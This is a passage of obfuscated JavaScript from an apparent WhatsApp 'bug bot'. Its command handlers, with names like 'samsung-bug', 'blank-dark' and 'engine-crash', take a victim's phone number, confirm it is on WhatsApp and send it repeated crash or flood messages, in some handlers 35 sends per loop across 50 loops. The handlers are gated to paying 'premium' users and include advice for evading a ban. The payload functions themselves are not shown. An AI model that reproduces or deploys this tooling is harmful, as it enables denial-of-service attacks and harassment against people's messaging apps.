            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x471407 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "samsung-bug":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x2c8488 = q.replace(/[^0-9]/g, '');
          if (_0x2c8488.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x506ac2 = _0x2c8488 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x42bf08 = 0x0; _0x42bf08 < 0x32; _0x42bf08++) {
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
            await _0x29f40b(_0x506ac2, _0x26c51b);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x2c8488 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "bug-quoted":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x4fea37 = q.replace(/[^0-9]/g, '');
          if (_0x4fea37.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x38e93a = _0x4fea37 + '@s.whatsapp.net';
          await _0x5c4040("In proses....");
          for (let _0x5adc27 = 0x0; _0x5adc27 < 0x32; _0x5adc27++) {
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
            await _0x29f40b(_0x38e93a, _0x26c51b);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x4fea37 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "bug-engine":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x3bedd6 = _0x1b77d5.split(',')[0x0];
          let _0x2ca696 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x3bedd6 || !_0x2ca696) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x2ca696))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x36152d = _0x3bedd6.replace(/[^0-9]/g, '');
          let _0x5e5d61 = '' + encodeURI(_0x2ca696);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x36152d + "@s.whatsapp.net");
          let _0x587d69 = _0x36152d + "@s.whatsapp.net";
          if (_0x36152d == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x587d69, _0x5e5d61);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x587d69.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x587d69]);
        }
        break;
      case "blank":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x5788e5 = _0x1b77d5.split(',')[0x0];
          let _0x503aae = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x5788e5 || !_0x503aae) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x503aae))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0xfe5096 = _0x5788e5.replace(/[^0-9]/g, '');
          let _0x48cf94 = '' + encodeURI(_0x503aae);
          var _0x42504b = await _0x29487e.onWhatsApp(_0xfe5096 + "@s.whatsapp.net");
          let _0x1e3ce1 = _0xfe5096 + "@s.whatsapp.net";
          if (_0xfe5096 == '94742274855') {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x1e3ce1, _0x48cf94);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x1e3ce1.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x1e3ce1]);
        }
        break;
      case "blank-dark":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x2db8cc = _0x1b77d5.split(',')[0x0];
          let _0x544576 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x2db8cc || !_0x544576) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x544576))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x157f33 = _0x2db8cc.replace(/[^0-9]/g, '');
          let _0x41e5fc = '' + encodeURI(_0x544576);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x157f33 + "@s.whatsapp.net");
          let _0x14702b = _0x157f33 + "@s.whatsapp.net";
          if (_0x157f33 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x14702b, _0x41e5fc);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x14702b.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x14702b]);
        }
        break;
      case "eror-bug":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x33d5af = _0x1b77d5.split(',')[0x0];
          let _0x54d0fd = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x33d5af || !_0x54d0fd) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x54d0fd))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0xf63789 = _0x33d5af.replace(/[^0-9]/g, '');
          let _0x688c4a = '' + encodeURI(_0x54d0fd);
          var _0x42504b = await _0x29487e.onWhatsApp(_0xf63789 + "@s.whatsapp.net");
          let _0x5d057f = _0xf63789 + "@s.whatsapp.net";
          if (_0xf63789 == '94742274855') {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x5d057f, _0x688c4a);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x5d057f.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x5d057f]);
        }
        break;
      case "spesial-bug":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x50e4c8 = _0x1b77d5.split(',')[0x0];
          let _0x544e65 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x50e4c8 || !_0x544e65) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x544e65))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x198003 = _0x50e4c8.replace(/[^0-9]/g, '');
          let _0x2ad3bb = '' + encodeURI(_0x544e65);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x198003 + '@s.whatsapp.net');
          let _0x4ed164 = _0x198003 + "@s.whatsapp.net";
          if (_0x198003 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x4ed164, _0x2ad3bb);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x4ed164.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x4ed164]);
        }
        break;
      case "anything-crash":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x4b5a98 = _0x1b77d5.split(',')[0x0];
          let _0x121b3f = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x4b5a98 || !_0x121b3f) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x121b3f))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x2988bd = _0x4b5a98.replace(/[^0-9]/g, '');
          let _0x3061fc = '' + encodeURI(_0x121b3f);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x2988bd + "@s.whatsapp.net");
          let _0x397d2b = _0x2988bd + "@s.whatsapp.net";
          if (_0x2988bd == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x397d2b, _0x3061fc);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x397d2b.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x397d2b]);
        }
        break;
      case "blank-ui":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x171ef2 = _0x1b77d5.split(',')[0x0];
          let _0x562773 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x171ef2 || !_0x562773) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x562773))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x30f1c9 = _0x171ef2.replace(/[^0-9]/g, '');
          let _0x4835fe = '' + encodeURI(_0x562773);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x30f1c9 + '@s.whatsapp.net');
          let _0x476191 = _0x30f1c9 + "@s.whatsapp.net";
          if (_0x30f1c9 == '94742274855') {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x476191, _0x4835fe);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x476191.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x476191]);
        }
        break;
      case "engine-ui":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x1844ca = _0x1b77d5.split(',')[0x0];
          let _0x1ce96d = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x1844ca || !_0x1ce96d) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x1ce96d))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x253aea = _0x1844ca.replace(/[^0-9]/g, '');
          let _0x3cb66b = '' + encodeURI(_0x1ce96d);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x253aea + "@s.whatsapp.net");
          let _0x4fd5a4 = _0x253aea + "@s.whatsapp.net";
          if (_0x253aea == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x4fd5a4, _0x3cb66b);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x4fd5a4.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x4fd5a4]);
        }
        break;
      case "engine-external":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x11ee1f = _0x1b77d5.split(',')[0x0];
          let _0x54147a = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x11ee1f || !_0x54147a) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x54147a))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x38addb = _0x11ee1f.replace(/[^0-9]/g, '');
          let _0x28f70a = '' + encodeURI(_0x54147a);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x38addb + '@s.whatsapp.net');
          let _0x42dc2b = _0x38addb + "@s.whatsapp.net";
          if (_0x38addb == '94742274855') {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x42dc2b, _0x28f70a);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x42dc2b.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x42dc2b]);
        }
        break;
      case "engine-internal":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x1bc262 = _0x1b77d5.split(',')[0x0];
          let _0x59e4cc = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x1bc262 || !_0x59e4cc) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x59e4cc))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x5677e0 = _0x1bc262.replace(/[^0-9]/g, '');
          let _0x219e53 = '' + encodeURI(_0x59e4cc);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x5677e0 + '@s.whatsapp.net');
          let _0x3c620b = _0x5677e0 + "@s.whatsapp.net";
          if (_0x5677e0 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x3c620b, _0x219e53);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x3c620b.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x3c620b]);
        }
        break;
      case "engine-crash":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x1ee239 = _0x1b77d5.split(',')[0x0];
          let _0x57160b = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x1ee239 || !_0x57160b) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x57160b))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x26dc40 = _0x1ee239.replace(/[^0-9]/g, '');
          let _0x210e2b = '' + encodeURI(_0x57160b);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x26dc40 + "@s.whatsapp.net");
          let _0x247833 = _0x26dc40 + "@s.whatsapp.net";
          if (_0x26dc40 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x247833, _0x210e2b);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x247833.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x247833]);
        }
        break;
      case "internal-quoted":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x51b5fc = q.replace(/[^0-9]/g, '');
          if (_0x51b5fc.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x5a66f1 = _0x51b5fc + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x18faa4 = 0x0; _0x18faa4 < 0x32; _0x18faa4++) {
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
            await _0x29f40b(_0x5a66f1, _0x26c51b);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x51b5fc + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "external-quoted":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x2e2c0b = q.replace(/[^0-9]/g, '');
          if (_0x2e2c0b.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x2446d1 = _0x2e2c0b + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x3614f9 = 0x0; _0x3614f9 < 0x32; _0x3614f9++) {
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
            await _0x29f40b(_0x2446d1, _0x26c51b);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x2e2c0b + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'stardust':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x2dd911 = q.replace(/[^0-9]/g, '');
          if (_0x2dd911.startsWith('0')) {
